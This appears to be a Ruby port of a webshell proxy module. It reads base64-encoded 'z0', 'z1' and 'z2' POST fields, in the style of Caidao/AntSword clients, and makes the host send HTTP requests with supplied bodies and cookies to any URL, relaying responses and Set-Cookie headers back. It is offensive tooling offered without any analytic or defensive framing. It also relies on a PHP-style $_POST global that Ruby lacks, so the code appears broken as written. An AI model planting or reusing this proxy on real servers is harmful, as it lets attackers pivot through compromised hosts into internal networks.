# $_POST: global variable

require 'base64'
require 'net/http'
require 'uri'

def http_post(url_str, data, mode, cookies)
  unless url_str.start_with?('http://', 'https://')
    url_str = "http://#{url_str}"
  end

  uri = URI.parse(url_str)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https')
  http.read_timeout = 15

  if mode == 'binary'
    request = Net::HTTP::Post.new(uri.request_uri)
    request['Content-Type'] = 'application/octet-stream'
    request.body = Base64.decode64(data)
  else
    request = Net::HTTP::Post.new(uri.request_uri)
    request['Content-Type'] = 'application/x-www-form-urlencoded'
    request.body = data
  end

  if cookies && !cookies.empty?
    request['Cookie'] = cookies
  end

  response = http.request(request)

  response.each_header do |key, value|
    if key.downcase == 'set-cookie'
      print "Set-Cookie: #{value}\r\n"
    end
  end

  body = response.body
  if mode == 'binary'
    body = Base64.strict_encode64(body)
  end

  [response.code.to_i, body]
rescue => e
  [0, "Error: #{e.message}"]
end

def main
  url   = Base64.decode64($_POST['z0'])
  data  = Base64.decode64($_POST['z1'])
  mode  = Base64.decode64($_POST['z2'])
  cookies = $_POST['HTTP_COOKIE']

  return if url.empty?

  http_code, body = http_post(url, data, mode, cookies)
  print body
  
  return
end

main